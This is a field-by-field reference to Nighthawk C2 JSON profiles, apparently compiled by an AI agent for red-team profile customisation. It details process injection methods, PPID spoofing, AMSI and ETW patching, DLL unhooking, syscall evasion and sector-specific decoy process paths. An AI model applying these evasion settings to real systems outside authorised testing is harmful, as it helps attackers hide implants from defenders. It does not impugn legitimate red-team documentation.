# Nighthawk Profile Structure

**Complete reference for Nighthawk C2 JSON profile anatomy, sections, and field descriptions.**

---

## Profile Overview

Nighthawk C2 is configured through JSON-based profiles that specify options for both the Nighthawk agents and the operations server/C2 endpoints. Profiles are deployed using the `DeployTool` command-line utility.

**Root Element**: All configuration contained within `c2-profile` JSON object

**Profile Deployment**:
```bash
DeployTool.exe --profile {profile-name}.json --server {ops-server-ip}:{port}
```

---

## Six Major Sections

| Section | Purpose | Customizable? |
|---------|---------|---------------|
| `api` | Operations server connection details | ❌ Operational |
| `strategy` | C2 endpoint type (HTTP/HTTPS) | ❌ Operational |
| `general-config` | Agent behavior, timing, OPSEC, code modules | ⚠️ Mixed |
| `server-config` | Server-side C2 endpoint configuration | ⚠️ Mixed |
| `egress-config` | Egress agent HTTP malleable profile | ✅ Partially |
| `p2p-config` | Peer-to-peer agent configuration | ⚠️ Mixed |

---

## Section 1: c2-profile.api

**Purpose**: Defines IP address and port of the Nighthawk operations server

**Structure**:
```json
{
  "c2-profile": {
    "api": {
      "host": "127.0.0.1",
      "port": 8888
    }
  }
}
```

**Fields**:
- `host` (string) - IP address or hostname of operations server
- `port` (number) - Port number for API server

**API Server Functions**:
- Provides command list for Nighthawk agents
- Receives command results from agents
- Manages agent registration and status

**Classification**: **OPERATIONAL - DO NOT MODIFY** (changes where C2 connects)

**When to Modify**: Only when deploying to different operations server (e.g., engagement-specific infrastructure)

---

## Section 2: c2-profile.strategy

**Purpose**: Specifies built-in C2 endpoint type to be created by Nighthawk server

**Structure**:
```json
{
  "c2-profile": {
    "strategy": "http"
  }
}
```

**Supported Strategies**:
- `"http"` - Supports both HTTP and HTTPS traffic (only built-in strategy at present)

**Custom Strategies**: If built-in strategies are insufficient, custom strategy modules can communicate directly with operations server

**Classification**: **OPERATIONAL - DO NOT MODIFY** (changes C2 channel type)

---

## Section 3: c2-profile.general-config

**Purpose**: Core agent configuration including timing, OPSEC, code modules, and injection

**Subsections**:
1. `settings` - Timing and expiration
2. `code-modules` - Custom encoders, transports
3. `injector` - Process injection configuration
4. `opsec` - EDR evasion and operational security (70+ settings)

### 3.1: general-config.settings

**Purpose**: Core agent timing and expiration

**Structure**:
```json
{
  "c2-profile": {
    "general-config": {
      "settings": {
        "interval": 10,
        "jitter": 20,
        "expire-after": 1670803200
      }
    }
  }
}
```

**Fields**:

**interval** (number):
- Sleep time in seconds between C2 communications
- Egress mode: Sleep before initial connection and between check-ins
- P2P mode: Sleep before attempting to service connections
- Recommended: Not too large for P2P (≤30 seconds) to avoid connection timeouts

**jitter** (number):
- Percentage (0-100) to randomly increase interval
- Example: interval=10, jitter=20 → actual sleep = random(10, 12) seconds
- Purpose: Avoid predictable beacon timing that aids detection

**expire-after** (number):
- Unix timestamp after which agent will not execute
- Example: `1640998861` = Sat Jan 01 2022 01:01:01 GMT+0000
- Purpose: Prevent agent execution beyond engagement timeline

**Classification**:
- `interval`, `jitter`: **OPERATIONAL** (affects detection surface, modify only with user approval)
- `expire-after`: **CUSTOMIZABLE** (should be set per engagement timeline)

**Self-Encryption Interaction**:
- If `interval` > `general-config.opsec.self-encrypt-after`, agent self-encrypts during sleep
- Modifying `interval` affects memory encryption behavior

### 3.2: general-config.code-modules

**Purpose**: Custom code modules for data encoding, egress communications, and P2P communications

**Structure**:
```json
{
  "c2-profile": {
    "general-config": {
      "code-modules": {
        "encoders": [ ... ],
        "egress-transports": [ ... ],
        "p2p-transports": [ ... ]
      }
    }
  }
}
```

**Subsections**:

#### encoders

**Purpose**: Optional modules for encoding data within built-in HTTP C2 strategy

**Module Structure**:
```json
{
  "type": "clr",
  "version": "v4.0.30319",
  "module-name": "MammaMia",
  "functions": ["MammaMia.Text.EncodeAsItalian", "MammaMia.Text.DecodeFromItalian"],
  "code": "TVqQAAMAAAAEAAAA...",
  "stomp-assembly-name": "System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL"
}
```

**Fields**:
- `type` (string) - Code type ("clr" for .NET runtime, only supported type currently)
- `version` (string) - Runtime version (e.g., "v4.0.30319")
- `module-name` (string) - Namespace for functions
- `functions` (string[]) - Fully qualified method names exposed by encoder
- `code` (string) - Base64-encoded module binary
- `stomp-assembly-name` (string) - .NET assembly name for evasion (**CUSTOMIZABLE**)

**Usage in Profiles**:
```json
{
  "egress-config": {
    "commands": {
      "putresult": {
        "build-request": {
          "body": "<payload:MammaMia.Text.EncodeAsItalian>"
        }
      }
    }
  }
}
```

**CRITICAL RULE**: All `stomp-assembly-name` values must be **unique** throughout the entire profile to avoid conflicts.

**Classification**:
- `stomp-assembly-name`: **CUSTOMIZABLE** (per-engagement indicator)
- `type`, `version`, `module-name`, `functions`, `code`: **OPERATIONAL** (changing breaks functionality)

#### egress-transports

**Purpose**: Custom C2 channels for egress communications (alternative to built-in HTTP strategy)

**Module Structure**:
```json
{
  "type": "clr",
  "version": "v4.0.30319",
  "module-name": "demohttp",
  "method-map": {
    "Initialize": "DemoTransports.HttpDemo.Initialize",
    "Register": "DemoTransports.HttpDemo.Register",
    "CheckConnectionStatus": "DemoTransports.HttpDemo.CheckConnectionStatus",
    "GetCommandList": "DemoTransports.HttpDemo.GetCommandList",
    "GetCommand": "DemoTransports.HttpDemo.GetCommand",
    "PutResponse": "DemoTransports.HttpDemo.PutResponse",
    "Sync": "DemoTransports.HttpDemo.Sync"
  },
  "code": "TVqQAAMAAAAEAAAA...",
  "stomp-assembly-name": "System.Data.OracleClient, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
}
```

**Required Methods** (7):
- `Initialize` - Set up transport
- `Register` - Register agent with C2
- `CheckConnectionStatus` - Verify C2 connectivity
- `GetCommandList` - Retrieve command IDs from C2
- `GetCommand` - Fetch specific command data
- `PutResponse` - Send command results to C2
- `Sync` - Synchronize agent state

**Classification**:
- `stomp-assembly-name`: **CUSTOMIZABLE**
- All other fields: **OPERATIONAL**

#### p2p-transports

**Purpose**: Custom P2P channels for agent-to-agent communications

**Module Structure**: Similar to egress-transports but with different method-map (Connect, Listen, Accept, Send, Receive, Close)

**Required Methods** (7):
- `Initialize` - Set up P2P transport
- `Connect` - Connect to peer
- `Listen` - Open P2P listener
- `Accept` - Accept incoming connection
- `Send` - Send data to peer
- `Receive` - Receive data from peer
- `Close` - Close P2P connection

**Classification**:
- `stomp-assembly-name`: **CUSTOMIZABLE**
- All other fields: **OPERATIONAL**

### 3.3: general-config.injector

**Purpose**: Process injection configuration for reflective DLL and shellcode injection

**Structure**:
```json
{
  "c2-profile": {
    "general-config": {
      "injector": {
        "methods": {
          "ProcessCreate": "CreateProcessWinApi",
          "ProcessOpen": "OpenProcessNative",
          "AllocMemory": "VirtualAllocNative",
          "WriteMemory": "WriteProcMemNative",
          "ProtectMemory": "VirtualProtectNative",
          "ThreadOpen": "CreateNewThreadNative",
          "ExecuteMemory": "QueueAPCNativeIndirect"
        },
        "spawn-to": "c:\\windows\\system32\\rundll32.exe",
        "parent-process": "explorer.exe",
        "use-rwx": true,
        "spawn-use-process-thread": true,
        "delay-executememory": 0
      }
    }
  }
}
```

**Fields**:

**methods** (object):
7-step injection chain with method selection for each step:

1. **ProcessCreate**: Create new process for injection
   - Options: `CreateProcessWinApi`, `CreateProcessNoMitigationsWinApi`
   - Used only when injecting into newly spawned process

2. **ProcessOpen**: Open existing process for injection
   - Options: `OpenProcessWinApi`, `OpenProcessNative`
   - Used when injecting into running process

3. **AllocMemory**: Allocate memory in remote process
   - Options: `VirtualAllocWinApi`, `VirtualAllocNative`, `CreateSectionNative`

4. **WriteMemory**: Write to remote process memory
   - Options: `WriteProcMemWinApi`, `WriteProcMemNative`, `CreateAndMapSectionNative`

5. **ProtectMemory**: Change memory protections
   - Options: `VirtualProtectWinApi`, `VirtualProtectNative`

6. **ThreadOpen**: Open thread for context switching or APC queuing
   - Options: `CreateNewThreadWinApi`, `CreateNewThreadNative`, `GetRandomThreadWinApi`, `GetRandomThreadNative`

7. **ExecuteMemory**: Schedule thread execution
   - Options: `CreateThreadWinApi`, `CreateThreadNative`, `CreateThreadNativeIndirect`, `QueueAPCWinApi`, `QueueAPCNative`, `QueueAPCNativeIndirect`, `SetContextWinApi`, `SetContextNative`, `SetContextNativeIndirect`, `ExperimentalHijack*`

**spawn-to** (string):
- Full Windows path to default injection target process
- Used by `spawn-rdll` and `spawn-shellcode` commands
- Example: `"c:\\windows\\system32\\rundll32.exe"`
- **CUSTOMIZABLE** - Vary per engagement to blend with target environment

**Customization Examples**:
```
Financial Services: "c:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
Healthcare: "c:\\Program Files (x86)\\Epic\\EpicCare.exe"
Tech/SaaS: "c:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
Manufacturing: "c:\\Program Files\\Rockwell Automation\\RSLinx\\Rslinx.exe"
```

**parent-process** (string):
- Process name to use as parent for newly spawned processes (PPID spoofing)
- First running instance with matching name is used
- Example: `"explorer.exe"`
- **CUSTOMIZABLE** - Vary per engagement

**Customization Examples**:
```
Generic: "explorer.exe", "svchost.exe"
Financial: "EXCEL.EXE", "OUTLOOK.EXE", "Bloomberg.exe"
Healthcare: "EpicCare.exe", "Cerner.exe"
Tech: "chrome.exe", "slack.exe", "Teams.exe"
```

**use-rwx** (boolean):
- Whether to use RWX (Read-Write-Execute) memory for injected shellcode
- Needed for self-modifying shellcode
- Nighthawk shellcode is NOT self-modifying, can be false
- **OPERATIONAL** - Do not modify without approval

**spawn-use-process-thread** (boolean):
- Whether to use new process main thread for execution (vs. creating new thread)
- Saves thread creation event
- **OPERATIONAL** - Do not modify without approval

**delay-executememory** (number):
- Delay in seconds before executing ExecuteMemory step
- Creates temporal disconnect between injection and execution
- **OPERATIONAL** - Do not modify without approval (affects timing-based detection)

**Classification Summary**:
- **CUSTOMIZABLE**: `spawn-to`, `parent-process`
- **OPERATIONAL**: `methods`, `use-rwx`, `spawn-use-process-thread`, `delay-executememory`

### 3.4: general-config.opsec

**Purpose**: EDR evasion and operational security configuration (70+ settings)

This is the largest and most complex section of the profile, containing interconnected OPSEC settings for:
- Reflective loader behavior
- Syscall usage and indirection
- DLL unhooking
- Self-encryption during sleep
- Detection evasion (ETW, AMSI, PI callbacks)
- Thread obfuscation
- Memory hiding
- .NET execution protection

**Structure** (abbreviated, full 70+ settings in official docs):
```json
{
  "c2-profile": {
    "general-config": {
      "opsec": {
        "loader-strategy": "syscalls",
        "use-syscalls": true,
        "indirect-syscalls": true,
        "unhook-dlls": ["kernel32.dll", "ntdll.dll", "kernelbase.dll", "winhttp.dll"],
        "self-encrypt-mode": "no-stub-timer",
        "self-encrypt-after": 5,
        "patch-etw-event": true,
        "patch-amsi": true,
        "disable-pi-callback": true,
        "thread-start-addresses": ["ntdll!RtlUserThreadStart"],
        "masquerade-thread-stacks": true,
        ... // 50+ additional settings
      }
    }
  }
}
```

**Key OPSEC Categories**:

**Loader Configuration**:
- `loader-strategy` - How reflective loader allocates memory ("winapi", "native", "syscalls", "threadpool")
- `loader-loadlib` - How dependencies are loaded ("winapi", "threadpool", "darkload")
- `loader-getproc` - How API addresses are resolved ("winapi", "native", "threadpool")
- `loader-disable-pi-callback` - Disable ProcessInstrumentationCallback during load
- `loader-indirect-syscalls` - Proxy syscalls via ntdll gadget
- `loader-unhook` - Unhook DLLs before reflective load
- `loader-erase-keystub` - Erase keying shellcode after load

**Syscall Configuration**:
- `use-syscalls` - Use direct syscalls instead of ntdll exports
- `use-syscalls-x86` - Enable syscalls for x86 agents (even with call-stack-masking)
- `indirect-syscalls` - Execute syscall via ntdll gadget (not from implant memory)
- `indirect-syscalls-from-dlls` - DLLs to source syscall gadgets from (e.g., `["umppc", "cylance"]`)
- `syscalls-spoof-ret-dlls` - DLLs to spoof return address from (for EDR that validate caller)

**Unhooking Configuration**:
- `unhook-dlls` - DLLs to unhook during initialization (e.g., `["kernel32.dll", "ntdll.dll"]`)
- `unhook-syscalls` - Unhook syscall stubs in ntdll
- `unhook-via-native` - Use native API for unhooking (avoids hooked WinAPI)
- `unhook-using-wpm` - Use WriteProcessMemory for unhooking (evade VirtualProtect hooks)
- `unhook-clear-guard` - Clear PAGE_GUARD traps during unhooking

**Self-Encryption**:
- `self-encrypt-mode` - Encryption strategy ("off", "stub", "no-stub-rop", "no-stub-timer", "no-stub-regwait")
  - `off`: No encryption
  - `stub`: Small shellcode stub encrypts/decrypts (leaves IOC)
  - `no-stub-rop`: ROP program encrypts/decrypts (no executable memory, but invalid stack unwind)
  - `no-stub-timer`: Threadpool timer callbacks (most OPSEC, no remnants)
  - `no-stub-regwait`: Threadpool wait callbacks (most OPSEC)
- `self-encrypt-after` - Minimum sleep interval (seconds) for encryption to trigger
- `self-encrypt-while-listening` - Encrypt during P2P listening
- `self-encrypt-evade-detections` - Additional evasion techniques for threadpool-based encryption
- `reapply-opsec-on-self-encrypt` - Re-run unhooking before/after encryption

**Detection Evasion**:
- `patch-etw-event` - Patch NtTraceEvent to reduce ETW telemetry
- `patch-amsi` - Patch AmsiScanBuffer to evade .NET assembly scanning
- `disable-pi-callback` - Clear ProcessInstrumentationCallback (intercepts syscalls)
- `clear-dll-notifications` - Clear DLL load notification callbacks
- `clear-veh-on-unhook` - Replace vectored exception handlers during unhooking
- `clear-hwbp-on-unhook` - Clear hardware breakpoints during unhooking
- `use-hwbp-for` - Install patches via hardware breakpoints (no memory modification)

**Thread Obfuscation**:
- `thread-start-addresses` - Spoof thread start addresses (e.g., `["ntdll!RtlUserThreadStart"]`)
- `masquerade-thread-stacks` - Overwrite thread contexts/TIBs during encryption with legitimate values
- `use-threadpool` - Use threadpool API for thread creation (evade kernel callbacks)
- `sleep-mode` - How agent sleeps ("sleep", "delay", "wait-single", "wait-multiple", "wait-signal")

**Memory Management**:
- `encrypt-heap-mode` - Heap memory encryption ("off", "implant", "implant+zero")
- `backing-module` - Migrate into legitimate DLL memory (e.g., `{"x64": "chakra.dll"}`)
- `stomp-pe-header` - Overwrite PE header in memory
- `darkload-dll-*` - Dark loading DLLs without image load events (multiple related settings)

**Classification**: **ALL OPERATIONAL - DO NOT MODIFY**

These settings are interconnected and form a complex evasion system. Modifying without deep understanding can:
- Break agent functionality
- Reduce OPSEC effectiveness
- Introduce instability

**Exception**: `thread-start-addresses` - Can be customized if varying thread start address spoofing targets per engagement (advanced)

### 3.5: general-config Interaction Diagram

```
settings.interval
   ├─> Affects beacon timing (detection surface)
   └─> Triggers self-encryption if > opsec.self-encrypt-after

code-modules.*.stomp-assembly-name
   └─> Must be unique across encoders + egress-transports + p2p-transports

injector.spawn-to
   └─> Target process for spawn-rdll / spawn-shellcode commands

injector.parent-process
   └─> PPID spoofing source for new processes

opsec.use-syscalls
   ├─> Enables syscall-based API calls throughout agent
   ├─> Affects loader-strategy execution
   ├─> Affects unhook-via-native behavior
   └─> Interacts with indirect-syscalls

opsec.self-encrypt-mode
   ├─> Requires interval > self-encrypt-after to activate
   ├─> Interacts with masquerade-thread-stacks
   └─> Affected by reapply-opsec-on-self-encrypt
```

**Key Insight**: general-config settings are NOT independent. They form an interconnected system where:
- Timing settings (`interval`) affect encryption behavior
- Syscall settings cascade through loader and unhooking
- Self-encryption interacts with thread obfuscation

**Implication for Customization**: Modify `spawn-to`, `parent-process`, `expire-after`, and assembly names. DO NOT touch other settings without approval.

---

## Section 4: c2-profile.server-config

**Purpose**: Server-side C2 endpoint configuration

**Structure**: Mirrors `egress-config` structure (commands with build-request and parse-response)

**Classification**: Similar to `egress-config` - URI paths and headers customizable, core structure operational

**Note**: Less commonly modified than `egress-config` since this controls server-side behavior

---

## Section 5: c2-profile.egress-config

**Purpose**: HTTP malleable profile for egress (outbound) agent communications

**Structure**:
```json
{
  "c2-profile": {
    "egress-config": {
      "c2-uri": "http://example.com",
      "commands": {
        "status": {
          "build-request": {
            "uri": "/api/v2/telemetry/status",
            "method": "POST",
            "headers": {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Content-Type": "application/json",
              "Accept": "application/json",
              "X-Client-Version": "2.1.4",
              "X-Request-ID": "{guid}"
            },
            "body": "<payload:encoder-function>"
          },
          "parse-response": {
            "status-code": 200,
            "headers": { ... },
            "body": "..."
          }
        },
        "getcommands": { ... },
        "putresult": { ... }
      }
    }
  }
}
```

**Fields**:

**c2-uri** (string):
- Base URI for C2 server
- Example: `"http://example.com"` or `"https://acme-corp.com"`

**commands** (object):
Three standard commands for agent-server communications:

1. **status**: Initial beacon / check-in request
2. **getcommands**: Retrieve command list from C2
3. **putresult**: Send command results to C2

**Each command structure**:

**build-request**:
- `uri` (string) - Request URI path (**CUSTOMIZABLE**)
- `method` (string) - HTTP method ("GET", "POST", "PUT", etc.) (**OPERATIONAL**)
- `headers` (object) - HTTP headers (**PARTIALLY CUSTOMIZABLE**)
  - `User-Agent` - **CUSTOMIZABLE**
  - `Content-Type` - **CUSTOMIZABLE** (must match URI pattern)
  - `Accept` - **CUSTOMIZABLE**
  - Custom headers (`X-*`) - **CUSTOMIZABLE**
- `body` (string) - Request body (may include encoder function calls) (**OPERATIONAL** unless varying encoder usage)

**parse-response**:
- `status-code` (number) - Expected HTTP response code (**OPERATIONAL**)
- `headers` (object) - Expected response headers (**OPERATIONAL**)
- `body` (string) - Response body parsing (may include decoder function calls) (**OPERATIONAL**)

**Classification Summary**:
- **CUSTOMIZABLE**: URI paths, User-Agent, Content-Type (match URI), Accept, custom headers (X-*)
- **OPERATIONAL**: HTTP methods, status codes, core request/response structure, encoder/decoder function calls

**Key Principle**: Customize the "look" of the traffic (URIs, headers, User-Agents) but NOT the structure or parsing logic.

---

## Section 6: c2-profile.p2p-config

**Purpose**: Configuration for peer-to-peer agent communications

**Structure**: Similar to `egress-config` but for P2P listener and connection configuration

**Key Fields**:
- `p2p-listener-uri` - URI for P2P listener (e.g., `"pipe://mypipe"` for named pipe)
- Custom P2P transport module configuration (if using custom P2P transports)

**Classification**: **MIXED** - URI patterns customizable (if not using custom transport), core structure operational

---

## Profile Skeleton (Complete Structure)

```json
{
  "c2-profile": {
    "api": {
      "host": "127.0.0.1",
      "port": 8888
    },
    "strategy": "http",
    "general-config": {
      "settings": {
        "interval": 10,
        "jitter": 20,
        "expire-after": 1670803200
      },
      "code-modules": {
        "encoders": [],
        "egress-transports": [],
        "p2p-transports": []
      },
      "injector": {
        "methods": { ... },
        "spawn-to": "c:\\windows\\system32\\rundll32.exe",
        "parent-process": "explorer.exe",
        "use-rwx": true,
        "spawn-use-process-thread": true,
        "delay-executememory": 0
      },
      "opsec": { ... }
    },
    "server-config": { ... },
    "egress-config": {
      "c2-uri": "http://example.com",
      "commands": {
        "status": { ... },
        "getcommands": { ... },
        "putresult": { ... }
      }
    },
    "p2p-config": { ... }
  }
}
```

---

## Field Count Summary

| Section | Total Fields | Customizable | Operational |
|---------|--------------|--------------|-------------|
| api | 2 | 0 | 2 |
| strategy | 1 | 0 | 1 |
| general-config.settings | 3 | 1 | 2 |
| general-config.code-modules | ~10 per module | stomp-assembly-name only | All others |
| general-config.injector | 7 | 2 | 5 |
| general-config.opsec | 70+ | ~5 (advanced) | 65+ |
| egress-config.commands | ~15 per command | URIs, headers | Methods, parsing |

**Total**: 100+ fields, ~20 customizable (indicators), 80+ operational

---

## Customization Safety Matrix

| Field Category | Customization Risk | User Approval Required? |
|----------------|-------------------|------------------------|
| URIs, User-Agents, Custom Headers | Low | No - expected per-engagement |
| Assembly stomp names | Low | No - but verify uniqueness |
| spawn-to, parent-process | Low-Medium | No - but verify processes exist on target |
| expire-after | Low | No - but match engagement timeline |
| interval, jitter | Medium | Yes - affects OPSEC profile |
| OPSEC settings (70+ fields) | High | Yes - interconnected, complex |
| HTTP methods, command structure | High | Yes - breaks profile functionality |

---

## Sources

- Nighthawk Official Documentation: `/Users/engineer/Downloads/nighthawk-0.4.2-praetorian-adam-crosser/Assets/StaticFiles/agent/Profile/index.html`
- Research Synthesis: `.claude/.output/research/2026-01-13-170110-nighthawk-profile-customization/SYNTHESIS.md`
